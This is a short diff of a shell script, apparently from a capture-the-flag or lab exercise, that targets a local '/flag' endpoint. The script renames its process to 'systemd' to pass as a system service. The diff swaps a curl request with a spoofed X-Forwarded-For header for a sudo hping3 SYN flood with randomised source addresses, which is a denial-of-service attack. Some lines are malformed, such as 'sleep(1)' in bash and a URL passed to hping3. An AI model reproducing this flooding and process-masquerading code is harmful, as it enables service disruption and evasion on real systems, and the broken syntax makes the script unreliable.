@@ -11,5 +11,6 @@ prctl --set-name "systemd"
 # cycle through ips randomly
 while true; do
     RANDOM_IP=${FAKE_IPS[$RANDOM % ${#FAKE_IPS[@]}]}
-    curl --header "X-Forwarded-For: $RANDOM_IP" localhost:80/flag
+    sudo hping3 -S --flood -p 80 --rand-source http://localhost/flag
+    sleep(1)
 done
